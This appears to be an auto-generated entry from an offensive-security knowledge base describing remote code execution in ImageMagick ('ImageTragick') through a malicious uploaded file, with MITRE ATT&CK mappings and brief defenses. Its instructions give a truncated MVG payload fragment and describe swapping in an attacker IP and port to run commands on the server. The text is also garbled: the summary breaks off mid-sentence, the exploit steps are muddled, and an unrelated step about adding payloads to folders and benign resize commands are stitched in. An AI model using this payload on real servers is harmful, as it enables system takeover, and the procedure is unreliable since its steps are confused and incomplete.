---
id: 8c2456f7-1663-4a16-9988-e17a93d2da41
name: ImageMagick Remote Code Execution via Insecure File Upload
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:41.148732+00:00'
updated_at: '2023-04-10T20:24:35.318771+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]'
tags:
- '[[CVE - Image Tragik]]'
- '[[Exploits]]'
- '[[Upload Insecure Files]]'
commands:
- '[[Add border to image]]'
- '[[Convert image format]]'
- '[[Resize image]]'
---

# ImageMagick Remote Code Execution via Insecure File Upload

## Summary

ImageMagick is a widely used open-source image processing tool that allows users to edit and manipulate images. However, it is prone to vulnerabilities that can be exploited by attackers to execute arbitrary code remotely. In this procedure, an attacker uploads a malicious file to the server, which

## Description

# Description

ImageMagick is a widely used open-source image processing tool that allows users to edit and manipulate images. However, it is prone to vulnerabilities that can be exploited by attackers to execute arbitrary code remotely. In this procedure, an attacker uploads a malicious file to the server, which is then processed by ImageMagick, leading to remote code execution. This can result in a complete takeover of the target system. 

Technical Explanation: The vulnerability lies in the ImageMagick policy.xml file, which allows attackers to execute arbitrary commands via specially crafted image files. This can be exploited by uploading a malicious file to the server, which is then processed by ImageMagick, leading to remote code execution. 

Business Value: By exploiting this vulnerability, attackers can gain full control of the target system, steal sensitive data, and disrupt business operations.

## Requirements

1. Access to the target server

1. Ability to upload files to the server

1. ImageMagick installed on the server

## Defense

1. Ensure that ImageMagick policy.xml file is properly configured and restricts access to external entities

1. Implement input validation to ensure that only valid image files are processed by ImageMagick

1. Regularly update ImageMagick to the latest version to patch known vulnerabilities

## Objectives

1. Upload a malicious file to the server

1. Execute arbitrary code remotely

# Instructions

1. To execute this command, upload the content with an image extension and run the following command: 'convert image.jpg exploit.mvg' and then use the following command to execute the payload: 'identify -verbose exploit.mvg'

**Code**: [[push graphic-context
viewbox 0 0 640 480
fill 'url]]

> This command exploits a vulnerability in ImageMagick version 7.0.1-1. The 'fill' command in the 'push graphic-context' section of the payload is used to specify a URL that contains a command to be executed. The command is enclosed in single quotes and is executed using the '|' character. The attacker can replace the 'attacker-ip' and 'attacker-port' with their own IP address and port number, respectively. The payload can be executed by converting the uploaded image to an MVG (Magick Vector Graphics) file and then using the 'identify' command with the '-verbose' flag to trigger the vulnerability.

2. To add payloads to a folder, use the 'add' command followed by the folder name and the payload name(s) separated by a space. For example: 'add folder_name payload1 payload2'

**Code**: [[Picture Image Magik]]

> The 'add' command allows you to add one or more payloads to a specific folder. The 'folder_name' argument specifies the name of the folder you want to add the payloads to. The 'payload1' and 'payload2' arguments represent the names of the payloads you want to add to the folder. You can add as many payloads as you want, just separate them with a space.

**Command** ([[Convert image format]]):

```bash
convert input.jpg output.png
```

**Command** ([[Resize image]]):

```bash
convert -resize 50% input.png output.png
```

**Command** ([[Add border to image]]):

```bash
convert -border 10x10 input.png output.png
```

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]

### Techniques

- [[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]

## Commands Used

- [[Add border to image]]
- [[Convert image format]]
- [[Resize image]]

## Tags

- [[CVE - Image Tragik]]
- [[Exploits]]
- [[Upload Insecure Files]]
